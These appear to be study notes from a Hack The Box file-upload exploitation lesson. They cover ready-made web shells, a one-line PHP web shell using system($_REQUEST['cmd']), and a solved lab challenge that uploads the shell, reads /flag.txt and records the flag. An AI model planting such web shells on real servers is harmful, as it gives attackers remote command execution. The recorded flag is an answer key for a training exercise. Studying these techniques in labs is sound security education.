
The final step in exploiting this web application is to upload the malicious script in the same language as the web application, like a web shell or a reverse shell script. Once we upload our malicious script and visit its link, we should be able to interact with it to take control over the back-end server.

Web Shells
We can find many excellent web shells online that provide useful features, like directory traversal or file transfer. One good option for PHP is phpbash, which provides a terminal-like, semi-interactive web shell. Furthermore, SecLists provides a plethora of web shells for different frameworks and languages, which can be found in the /opt/useful/seclists/Web-Shells directory in PwnBox.

We can download any of these web shells for the language of our web application (PHP in our case), then upload it through the vulnerable upload feature, and visit the uploaded file to interact with the web shell. For example, let's try to upload phpbash.php from phpbash to our web application, and then navigate to its link by clicking on the Download button:

url example: http://SERVER_IP:PORT/uploads/phpbash.php

Writing Custom Web Shell
Although using web shells from online resources can provide a great experience, we should also know how to write a simple web shell manually. This is because we may not have access to online tools during some penetration tests, so we need to be able to create one when needed.

For example, with PHP web applications, we can use the system() function that executes system commands and prints their output, and pass it the cmd parameter with $_REQUEST['cmd'], as follows:

!*!*!*!*! web shel example **!*!*!*!*!! 

<?php system($_REQUEST['cmd']); ?>

If we write the above script to shell.php and upload it to our web application, we can execute system commands with the ?cmd= GET parameter (e.g. ?cmd=id), as follows:

URL http://SERVER_IP:PORT/uploads/shell.php?cmd=id


Tip: If we are using this custom web shell in a browser, it may be best to use source-view by clicking [CTRL+U], as the source-view shows the command output as it would be shown in the terminal, without any HTML rendering that may affect how the output is formatted.

CHALLENGE: 94.237.63.45:57068

Question 1 - Try to exploit the upload feature to upload a web shell and get the content of /flag.txt
1) make shell.php -> copy this one liner into it -> <?php system($_REQUEST['cmd']); ?>
2) upload to http://94.237.63.45:57068
3)http://94.237.63.45:57068/uploads/shell.php?cmd=cat%20/flag.txt
4) HTB{g07_my_f1r57_w3b_5h3ll}
